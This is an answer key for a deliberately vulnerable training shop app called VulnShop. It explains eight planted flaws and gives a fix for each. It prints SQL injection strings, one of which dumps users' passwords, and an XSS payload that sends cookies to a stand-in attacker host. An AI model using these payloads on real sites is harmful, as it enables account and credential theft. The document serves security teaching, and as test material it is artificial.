# VulnShop -- Vulnerability Answer Key

This document describes all 8 planted vulnerabilities, where they live,
why they are dangerous, and how to fix each one.

---

## 1. SQL Injection in Product Search

| Field    | Value |
|----------|-------|
| File     | `src/routes/products.js` |
| Endpoint | `GET /api/products/search?q=` |
| Severity | **Critical** |

### Description

The search query parameter is concatenated directly into the SQL string:

```js
const sql = `SELECT * FROM products WHERE name LIKE '%${query}%' ...`;
```

An attacker can inject arbitrary SQL. Examples:

```
GET /api/products/search?q=' OR 1=1 --
GET /api/products/search?q=' UNION SELECT id,username,email,password,role,null,null,null FROM users --
```

The second example leaks every user's cleartext password.

### Fix

Use parameterized queries:

```js
const stmt = db.prepare(
  "SELECT * FROM products WHERE name LIKE ? OR description LIKE ?"
);
const products = stmt.all(`%${query}%`, `%${query}%`);
```

---

## 2. Cross-Site Scripting (XSS) in Product Reviews

| Field    | Value |
|----------|-------|
| File     | `src/routes/products.js` |
| Endpoint | `POST /api/products/:id/reviews` |
| Severity | **High** |

### Description

Review comments are stored and returned exactly as submitted. A malicious
user can submit:

```json
{ "rating": 5, "comment": "<script>document.location='https://evil.com/steal?c='+document.cookie</script>" }
```

Any frontend that renders the comment as raw HTML will execute the script,
allowing session hijacking, data theft, or defacement.

### Fix

Sanitize input before storage (e.g., with `DOMPurify` or `sanitize-html`),
or at minimum HTML-encode special characters (`<`, `>`, `&`, `"`, `'`).
Also validate that `rating` is an integer between 1 and 5 and that
`comment` length is bounded.

```js
import sanitizeHtml from "sanitize-html";

const cleanComment = sanitizeHtml(comment, { allowedTags: [], allowedAttributes: {} });
```

---

## 3. Hardcoded JWT Secret

| Field    | Value |
|----------|-------|
| File     | `src/routes/auth.js` |
| Line     | `const JWT_SECRET = "super-secret-key-123"` |
| Severity | **Critical** |

### Description

The JWT signing secret is hardcoded in source code. Anyone with read
access to the repository (including public repos on GitHub) can forge
valid JWTs for any user, including admin accounts.

### Fix

Load the secret from an environment variable and require it at startup:

```js
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) {
  throw new Error("JWT_SECRET environment variable is required");
}
```

Use a long, random string (256+ bits of entropy) and store it in a
secrets manager or `.env` file excluded from version control.

---

## 4. No Rate Limiting on Login

| Field    | Value |
|----------|-------|
| File     | `src/routes/auth.js` |
| Endpoint | `POST /api/auth/login` |
| Severity | **High** |

### Description

There is no rate limiter or account lockout on the login endpoint. An
attacker can submit thousands of password guesses per second in a
brute-force or credential-stuffing attack.

### Fix

Add `express-rate-limit`:

```js
import rateLimit from "express-rate-limit";

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10,                   // max 10 attempts per window
  message: { error: "Too many login attempts. Try again later." },
});

router.post("/login", loginLimiter, (req, res) => { ... });
```

Also consider adding account lockout after N consecutive failures.

---

## 5. Stack Traces Exposed in Error Responses

| Field    | Value |
|----------|-------|
| File     | `src/index.js` (missing error handler) and all route files (`err.message` returned) |
| Severity | **Medium** |

### Description

When an unhandled error occurs, Express's default error handler sends the
full stack trace to the client (in development mode). Additionally,
several route handlers explicitly return `err.message`, which can contain
internal paths, SQL syntax, or dependency details that help attackers.

### Fix

Add a global error-handling middleware at the end of `src/index.js`:

```js
app.use((err, _req, res, _next) => {
  console.error(err);
  res.status(err.status || 500).json({
    error: "Internal server error",
  });
});
```

And set `NODE_ENV=production` in production, which tells Express not to
include stack traces.

---

## 6. Missing CORS Configuration

| Field    | Value |
|----------|-------|
| File     | `src/index.js` |
| Severity | **Medium** |

### Description

The `cors` package is listed as a dependency and installed, but it is
never imported or used. Without proper CORS headers, the API's behavior
depends entirely on the browser default (same-origin policy). More
importantly, the lack of explicit CORS configuration means there is no
allowlist of trusted origins, leaving the API open to cross-origin
requests from any domain if a permissive proxy or misconfigured browser
is involved.

### Fix

Import and configure `cors` with an explicit origin allowlist:

```js
import cors from "cors";

app.use(cors({
  origin: ["https://vulnshop.example.com"],
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));
```

---

## 7. No File Type Validation on Upload

| Field    | Value |
|----------|-------|
| File     | `src/routes/upload.js` |
| Endpoint | `POST /api/upload` |
| Severity | **High** |

### Description

The multer configuration has:
- **No `fileFilter`** -- any file type is accepted (`.exe`, `.sh`, `.php`, `.html`, `.svg`).
- **No `limits`** -- no maximum file size, enabling denial-of-service via large uploads.
- **Unsanitized original filename** -- path traversal characters like `../../` could escape the uploads directory.

### Fix

```js
const upload = multer({
  storage,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5 MB max
  },
  fileFilter: (_req, file, cb) => {
    const allowed = ["image/jpeg", "image/png", "image/gif", "image/webp"];
    if (allowed.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error("Only image files (JPEG, PNG, GIF, WebP) are allowed"));
    }
  },
});
```

Also sanitize the filename (strip path separators, use a UUID, etc.).

---

## 8. Cleartext Password Storage

| Field    | Value |
|----------|-------|
| Files    | `src/database.js` (seed data), `src/routes/auth.js` (register + login) |
| Severity | **Critical** |

### Description

User passwords are stored as plain text in the database. The registration
endpoint inserts the password directly, and the login endpoint compares
with `===` instead of a constant-time hash comparison. If the database is
ever compromised (e.g., via the SQL injection in vulnerability #1), every
user's password is immediately readable.

### Fix

Use `bcrypt` (or `argon2`) to hash passwords on registration and verify
on login:

```js
import bcrypt from "bcrypt";

// Registration
const hashedPassword = await bcrypt.hash(password, 12);
stmt.run(username, email, hashedPassword);

// Login
const isMatch = await bcrypt.compare(password, user.password);
if (!isMatch) {
  return res.status(401).json({ error: "Invalid credentials" });
}
```

---

## Summary Table

| # | Vulnerability               | Severity | Semgrep Detectable? |
|---|-----------------------------|----------|---------------------|
| 1 | SQL Injection               | Critical | Yes                 |
| 2 | XSS in reviews              | High     | Partial             |
| 3 | Hardcoded JWT secret        | Critical | Yes                 |
| 4 | No rate limiting            | High     | No (logic issue)    |
| 5 | Stack trace exposure        | Medium   | No (config issue)   |
| 6 | Missing CORS configuration  | Medium   | No (missing code)   |
| 7 | No file type validation     | High     | Partial             |
| 8 | Cleartext passwords         | Critical | No (logic issue)    |

This illustrates why both **automated scanning** and **AI-assisted review**
are needed -- neither alone catches everything.
